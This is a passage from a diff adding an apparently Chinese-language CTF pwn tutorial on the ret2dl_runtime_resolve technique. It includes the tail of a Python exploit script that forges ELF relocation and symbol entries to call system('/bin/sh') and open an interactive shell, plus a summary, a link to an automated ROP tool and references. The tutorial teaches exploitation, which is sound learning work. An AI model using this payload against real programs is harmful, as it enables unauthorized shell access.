+    <span class="n">index_dynsym_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_dynsym</span> <span class="o">-</span> <span class="n">elf_dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span><span class="c1">#dynsym下标</span>
+    <span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym_addr</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
+
+    <span class="n">hack_rel</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span><span class="c1">#伪造reloc段</span>
+    <span class="c1">#伪造dynsym段</span>
+    <span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_dynsym</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="n">elf_dynstr</span><span class="c1">#这里+0x10是因为上面填的fake_dynsym占了0x10字节</span>
+    <span class="n">fake_dynsym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+
+    <span class="c1">#system("/bin/sh")</span>
+    <span class="n">payload2</span> <span class="o">=</span> <span class="s1">'AAAA'</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">PLT</span><span class="p">)</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span><span class="c1">#reloc_arg</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'AAAA'</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span><span class="c1">#参数位置</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'AAAA'</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'AAAA'</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">hack_rel</span> <span class="c1">#stack_addr+28</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="n">align</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_dynsym</span> <span class="c1"># stack_addr+36+align</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s2">"system</span><span class="se">\x00</span><span class="s2">"</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span>
+    <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+
+    <span class="c1">#debug()</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">exp</span><span class="p">()</span>
+</pre></div>
+<h1 data-content="1" id="a3ed0851a3d3a272cad7d7285c541aa1">小结</h1>
+<p>ret2dl_runtime_resolve的操作比较独特的一点是不需要leak，只需要一个控制程序流程的洞和有可控空间，就可以实现这个操作，在pwn中还是非常有用的一个操作，通过学习这个技巧，也能对elf文件格式以及动态链接，延迟绑定的机制有进一步的理解</p>
+<p>然后，其实这里有个自动化的工具可以实现一把梭rop的构造，非常好用，但是还是建议理解清楚原理再去用工具</p>
+<p><a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py" target="_blank">https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py</a></p>
+<h1 data-content="1" id="8fc7400118cd6d291f5ce667d7a24f0f">参考</h1>
+<p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br/>
+<a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br/>
+<a href="https://www.jianshu.com/p/e13e1dce095d" target="_blank">https://www.jianshu.com/p/e13e1dce095d</a><br/>
+<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+</div>
+</div>
